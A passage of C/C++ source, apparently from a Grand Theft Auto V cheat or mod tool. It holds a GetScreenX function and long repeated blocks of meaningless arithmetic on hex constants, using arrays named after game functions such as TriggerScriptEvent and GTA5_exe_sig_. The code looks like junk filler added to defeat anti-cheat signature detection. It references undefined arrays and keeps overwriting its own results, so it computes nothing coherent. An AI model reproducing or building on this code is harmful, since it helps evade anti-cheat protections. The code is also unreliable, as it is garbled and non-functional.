			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		int GetScreenX()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
